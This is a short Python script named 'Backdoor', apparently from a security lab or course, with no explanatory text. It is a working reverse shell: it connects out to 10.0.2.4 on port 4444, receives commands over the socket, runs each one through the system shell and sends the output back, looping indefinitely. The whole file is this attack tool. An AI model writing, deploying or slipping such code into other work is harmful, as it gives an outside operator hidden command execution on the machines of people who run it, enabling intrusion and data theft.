#!/usr/bin/env python

import socket
import subprocess

class Backdoor:
    def __init__(self,ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connection.connect(("10.0.2.4", 4444))
        self.connection.connect((ip, port))

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)


    def run(self):
        while True:
            command = self.connection.recv(2048).decode()
            command_result = self.execute_sys_command(command)
            self.connection.send(command_result)

        self.connection.close()

my_Backdoor = Backdoor("10.0.2.4", 4444)
my_Backdoor.run()
